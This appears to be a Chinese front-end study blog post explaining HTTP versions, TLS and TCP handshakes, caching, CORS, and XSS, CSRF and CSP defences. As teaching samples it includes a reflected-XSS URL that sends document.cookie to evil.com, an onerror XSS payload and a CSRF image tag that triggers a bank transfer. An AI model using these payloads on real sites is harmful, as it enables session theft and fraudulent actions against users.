---
title: "网络与浏览器安全"
date: 2026-05-13
tags:
  - 网络
  - 安全
  - 前端基础
sort: 4
summary: HTTP 缓存策略总是记混？强缓存和协商缓存的区别是什么？CORS 为什么这么烦？XSS 和 CSRF 到底怎么防？这篇文章帮你把网络和安全相关的知识重新捋清楚。
---

# 网络与浏览器安全

这是前端开发里最容易"知道但说不清楚"的一块知识。HTTP 缓存的几个头部字段你可能都见过，但让你画出完整的决策流程，大概率会卡住。CORS 的报错你肯定处理过，但预检请求到底什么时候触发、为什么触发，不一定能答上来。XSS 和 CSRF 的区别呢？防御手段呢？

这篇文章把这些零散的知识点串起来，帮你重新建立一个清晰的认知框架。

## HTTP 协议演进

### HTTP/1.1

我们最熟悉的版本。核心特性是持久连接（Connection: keep-alive）和管道化（pipelining），但管道化因为队头阻塞（Head-of-Line Blocking）问题，浏览器基本都没启用。

HTTP/1.1 最大的瓶颈就是：每个 TCP 连接同一时间只能处理一个请求-响应。浏览器的解决办法是对同一域名开 6-8 个并发连接，这也是为什么以前会有"域名分片"这种优化手段——把静态资源散到多个子域名上。

### HTTP/2

HTTP/2 解决了 HTTP/1.1 最核心的性能问题，主要靠这几个特性：

- 多路复用：一个 TCP 连接上可以同时跑多个请求-响应，彻底干掉了队头阻塞（应用层的）
- 头部压缩（HPACK）：HTTP 头部不再每次都完整发送，用静态表 + 动态表 + 哈夫曼编码压缩
- 服务器推送：服务器可以主动推送资源（不过实际使用率很低，Chrome 已经[移除了对它的支持](https://developer.chrome.com/blog/removing-push)）
- 二进制分帧：数据以二进制帧传输，不再是纯文本

不过 HTTP/2 还是跑在 TCP 上的，TCP 层的队头阻塞问题依然存在——一个包丢了，后面所有包都得等。

### HTTP/3

HTTP/3 最大的变化是把传输层从 TCP 换成了 QUIC（基于 UDP）。QUIC 自带 TLS 1.3，连接建立更快（0-RTT 或 1-RTT），而且每个流独立，一个流丢包不影响其他流。

简单记一下核心差异：

| 特性 | HTTP/1.1 | HTTP/2 | HTTP/3 |
|------|----------|--------|--------|
| 传输层 | TCP | TCP | QUIC (UDP) |
| 多路复用 | 不支持 | 支持 | 支持 |
| 队头阻塞 | 有 | TCP 层仍有 | 解决 |
| 头部压缩 | 无 | HPACK | QPACK |
| 连接建立 | TCP + TLS | TCP + TLS | 1-RTT / 0-RTT |

## HTTPS 与 TLS 握手

HTTPS = HTTP + TLS。TLS 在传输层和应用层之间加了一层加密，保证数据的机密性、完整性和身份认证。

现在主流是 TLS 1.3，相比 TLS 1.2 减少了一次往返（从 2-RTT 降到 1-RTT），而且砍掉了一大堆不安全的加密套件。

TLS 1.3 握手流程（简化版）：

1. 客户端发 ClientHello：支持的加密套件列表 + 密钥共享参数（Key Share）
2. 服务器回 ServerHello：选定的加密套件 + 服务器的 Key Share + 证书 + 签名
3. 双方用 ECDHE 算出会话密钥，后续通信全部加密

TLS 1.3 之所以能做到 1-RTT，是因为客户端在第一条消息里就把密钥交换的参数带上了。如果之前连接过（有 PSK），甚至可以做到 0-RTT——第一条消息就带加密数据。不过 0-RTT 有重放攻击风险，只适合幂等请求。

## TCP 三次握手与四次挥手

这个知识点每次面试都会问，简要过一下。

三次握手建立连接：

```
客户端 → SYN(seq=x) → 服务器
客户端 ← SYN-ACK(seq=y, ack=x+1) ← 服务器
客户端 → ACK(ack=y+1) → 服务器
```

为什么是三次不是两次？因为两次握手无法防止历史的重复连接请求。如果客户端之前发的一个 SYN 延迟到达，服务器会以为是新连接，白白分配资源。第三次握手让客户端有机会确认"这确实是我要建立的连接"。

四次挥手关闭连接：

```
主动方 → FIN → 被动方
主动方 ← ACK ← 被动方    （被动方可能还有数据要发）
主动方 ← FIN ← 被动方    （数据发完了）
主动方 → ACK → 被动方
```

四次挥手比三次握手多一步，因为 TCP 是全双工的，每一端的关闭需要独立确认。被动方收到 FIN 后可能还有数据没发完，不能立刻关闭自己这一端。

## HTTP 缓存机制

这是前端性能优化的基础，也是容易记混的地方。HTTP 缓存分两种策略：强缓存和协商缓存。

### 强缓存

强缓存命中时，浏览器直接用本地缓存，根本不会发请求到服务器。状态码显示 `200 (from disk cache)` 或 `200 (from memory cache)`。

控制强缓存的头部：

```http
Cache-Control: max-age=31536000
```

`max-age` 是相对时间（秒），表示资源从响应生成后多少秒内有效。这是目前推荐的方式。

```http
Expires: Thu, 01 Jan 2027 00:00:00 GMT
```

`Expires` 是绝对时间，HTTP/1.0 时代的产物。问题是它依赖客户端时钟，如果客户端时间不准就会出问题。当 `Cache-Control` 和 `Expires` 同时存在时，`Cache-Control` 优先。

`Cache-Control` 常用指令：

| 指令 | 含义 |
|------|------|
| `max-age=N` | 资源在 N 秒内有效 |
| `no-cache` | 每次都要向服务器验证（走协商缓存） |
| `no-store` | 完全不缓存 |
| `public` | 中间代理也可以缓存 |
| `private` | 只有浏览器可以缓存 |
| `immutable` | 资源永远不会变（配合内容哈希文件名使用） |

注意 `no-cache` 不是"不缓存"，是"缓存但每次要验证"。想完全不缓存得用 `no-store`。这个命名是 HTTP 规范里最经典的误导之一。

### 协商缓存

强缓存过期后，浏览器会带着验证信息向服务器确认资源是否变了。如果没变，服务器返回 `304 Not Modified`，浏览器继续用本地缓存。

两组头部，选一种或都用：

**Last-Modified / If-Modified-Since**

```http
# 响应头（服务器告知最后修改时间）
Last-Modified: Wed, 10 May 2026 08:00:00 GMT

# 请求头（浏览器下次带上这个时间）
If-Modified-Since: Wed, 10 May 2026 08:00:00 GMT
```

服务器比较时间，没变就返回 304。缺点是精度只到秒，而且有些情况下文件虽然被重新保存了但内容没变，时间戳还是会更新。

**ETag / If-None-Match**

```http
# 响应头（服务器返回资源的指纹）
ETag: "abc123def456"

# 请求头（浏览器下次带上这个指纹）
If-None-Match: "abc123def456"
```

ETag 是资源内容的指纹（通常是哈希值），比时间戳更准确。当两者同时存在时，ETag 优先级更高。

### 缓存策略的最佳实践

现代前端项目一般这么做：

- 带内容哈希的静态资源（`app.a1b2c3.js`）：`Cache-Control: max-age=31536000, immutable`，缓存一年，内容变了文件名自然会变
- HTML 入口文件：`Cache-Control: no-cache`，每次都走协商缓存确认是否有新版本
- API 响应：按业务需求设置，实时性要求高的用 `no-store`

## 同源策略

同源策略是浏览器安全的基石。两个 URL 的协议、域名、端口三者完全一致才算同源。

```
https://example.com/page     ← 基准
https://example.com/other    ← 同源 ✓
http://example.com/page      ← 协议不同 ✗
https://api.example.com/data ← 域名不同 ✗
https://example.com:8080/    ← 端口不同 ✗
```

同源策略限制了什么：

- DOM 访问：不能跨域读取 iframe 里的 DOM
- 数据请求：XMLHttpRequest 和 Fetch 不能读取跨域响应
- 存储：localStorage、IndexedDB 按源隔离
- Cookie：默认只发送给同源请求（但可以通过 domain 属性放宽到父域名）

注意，同源策略限制的是读取响应，不是发送请求。跨域请求其实是发出去了的（简单请求的情况下），只是浏览器拦截了响应。这个细节对理解 CSRF 攻击很重要。

## 跨域与 CORS

[CORS（Cross-Origin Resource Sharing）](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Guides/CORS)是浏览器和服务器之间协商跨域访问的机制。服务器通过响应头告诉浏览器"我允许这个源来访问"。

### 简单请求

满足以下全部条件的请求，浏览器直接发送，不需要预检：

- 方法是 GET、HEAD 或 POST
- 只用了[安全的头部](https://fetch.spec.whatwg.org/#cors-safelisted-request-header)（Accept、Accept-Language、Content-Language、Content-Type 等）
- Content-Type 仅限 `text/plain`、`multipart/form-data`、`application/x-www-form-urlencoded`

浏览器会在请求里自动加 `Origin` 头，服务器在响应里返回：

```http
Access-Control-Allow-Origin: https://example.com
```

如果这个头没有或者不匹配，浏览器就拦截响应。

### 预检请求

不满足简单请求条件的（比如用了 `application/json`、加了自定义头、用了 PUT/DELETE 方法），浏览器会先发一个 OPTIONS 请求"问一下"：

```http
OPTIONS /api/data HTTP/1.1
Origin: https://example.com
Access-Control-Request-Method: PUT
Access-Control-Request-Headers: Content-Type, Authorization
```

服务器回应允许的范围：

```http
HTTP/1.1 204 No Content
Access-Control-Allow-Origin: https://example.com
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
Access-Control-Allow-Headers: Content-Type, Authorization
Access-Control-Max-Age: 86400
```

`Access-Control-Max-Age` 告诉浏览器这个预检结果可以缓存多久，避免每个请求都先飞一个 OPTIONS。

### 带凭证的跨域请求

默认情况下跨域请求不会带 Cookie。如果需要：

```javascript
fetch('https://api.example.com/data', {
  credentials: 'include'
});
```

服务器也要配合：

```http
Access-Control-Allow-Credentials: true
Access-Control-Allow-Origin: https://example.com
```

这时候 `Access-Control-Allow-Origin` 不能用通配符 `*`，必须指定具体的源。这是很多人踩的坑——开发环境用 `*` 一切正常，一旦要带 Cookie 就报错。

## XSS 攻击与防御

XSS（Cross-Site Scripting）的核心是：攻击者想办法让恶意脚本在你的页面上执行。

### 三种类型

**反射型 XSS**：恶意代码通过 URL 参数传入，服务器把它原样拼进 HTML 返回。用户点了攻击者构造的链接就中招。

```
https://example.com/search?q=<script>document.location='https://evil.com/?c='+document.cookie</script>
```

**存储型 XSS**：恶意代码被存进数据库（比如评论区），每个访问的用户都会执行。危害范围更大。

**DOM 型 XSS**：恶意代码不经过服务器，完全在客户端通过 DOM 操作注入。比如：

```javascript
// 危险：直接把 URL 参数插入 DOM
const name = new URLSearchParams(location.search).get('name');
document.getElementById('greeting').innerHTML = `Hello, ${name}`;
```

攻击者构造 `?name=<img src=x onerror=alert(1)>`，就能执行任意脚本。

### 防御手段

最基本的原则：永远不要信任用户输入。

**输出编码**：在插入 HTML 时对特殊字符转义。

```javascript
function escapeHTML(str) {
  return str
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');
}
```

现代框架（React、Vue）默认会做这件事。React 的 JSX 会自动转义插值内容，所以 `{userInput}` 是安全的。但如果你用了 `dangerouslySetInnerHTML` 或 Vue 的 `v-html`，那就是你自己承担风险了。

**避免危险的 DOM API**：

```javascript
// 危险
element.innerHTML = userInput;
document.write(userInput);

// 安全
element.textContent = userInput;
```

**HttpOnly Cookie**：给敏感 Cookie（比如 session token）加上 `HttpOnly` 标志，JavaScript 无法通过 `document.cookie` 读取。即使页面被 XSS 了，攻击者也拿不到 Cookie。

```http
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict
```

## CSRF 攻击与防御

CSRF（Cross-Site Request Forgery）和 XSS 不同——它不需要在你的页面上执行脚本。攻击者利用的是浏览器会自动带上 Cookie 这个行为。

攻击场景：你登录了银行网站，然后访问了一个恶意页面，恶意页面里有这么一段：

```html
<img src="https://bank.com/transfer?to=attacker&amount=10000" />
```

浏览器加载这个图片时会向 bank.com 发请求，并且自动带上你的登录 Cookie。银行服务器看到合法的 Cookie，就执行了转账。

### 防御手段

**CSRF Token**：服务器在页面或 Cookie 中下发一个随机 token，每次提交表单时必须带上。攻击者无法读取你页面上的 token，所以构造不出合法请求。

```javascript
fetch('/api/transfer', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'X-CSRF-Token': csrfToken
  },
  body: JSON.stringify({ to: 'someone', amount: 100 })
});
```

**SameSite Cookie**：这是目前最简单有效的防御方式。通过 Cookie 的 `SameSite` 属性控制跨站请求是否携带 Cookie。

```http
Set-Cookie: session=abc123; SameSite=Strict
```

三个取值：

| 值 | 行为 |
|------|------|
| `Strict` | 跨站请求完全不带 Cookie（连从外部链接点进来都不带） |
| `Lax` | 跨站的顶级导航 GET 请求会带，其他不带（默认值） |
| `None` | 都带（必须配合 `Secure` 使用） |

`Lax` 是大多数场景的合理选择。`Strict` 太严格了，用户从邮件里点链接进来都要重新登录，体验不好。

**额外注意**：不要用 GET 请求做有副作用的操作。只要你的转账接口是 POST，光靠 `<img>` 标签就构造不了攻击了（虽然攻击者还可以用表单提交，但防御起来更容易）。

## CSP 内容安全策略

[CSP（Content Security Policy）](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Guides/CSP)是防御 XSS 的一道强力屏障。它让你声明页面允许加载哪些来源的资源，不在白名单里的一律拦截。

通过 HTTP 响应头设置：

```http
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com; style-src 'self' 'unsafe-inline'; img-src *; connect-src 'self' https://api.example.com
```

拆开看每条指令：

- `default-src 'self'`：默认只允许同源资源
- `script-src 'self' https://cdn.example.com`：脚本只能从同源和指定 CDN 加载
- `style-src 'self' 'unsafe-inline'`：样式允许同源和内联（CSS-in-JS 经常需要这个）
- `img-src *`：图片不限来源
- `connect-src 'self' https://api.example.com`：AJAX/Fetch 只能请求同源和指定 API

如果攻击者注入了 `<script src="https://evil.com/steal.js">`，浏览器会直接拦截，因为 `evil.com` 不在 `script-src` 白名单里。

刚上 CSP 时建议先用报告模式，不拦截只报告：

```http
Content-Security-Policy-Report-Only: default-src 'self'; report-uri /csp-report
```

这样可以先观察会触发哪些违规，逐步调整策略，避免一上来就把正常功能搞挂。

关于 CSP 的详细指令列表和用法，可以参考 [MDN 的 CSP 文档](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy)以及 [W3C 规范](https://www.w3.org/TR/CSP3/)。

## 总结一下

把这篇文章的知识点连起来看，其实是一条完整的链路：

1. TCP 建连 → TLS 握手 → HTTP 请求
2. 浏览器通过缓存策略减少不必要的请求
3. 同源策略和 CORS 控制跨域资源访问
4. XSS 防御保证页面不执行恶意脚本
5. CSRF 防御保证用户操作是本人意愿
6. CSP 作为最后一道防线兜底

这些机制互相配合，构成了浏览器的安全模型。单独拎出来哪个都不完美，但组合在一起就形成了一个相当可靠的防御体系。能从整体视角把它们串起来理解，比死记零散的知识点有用得多。
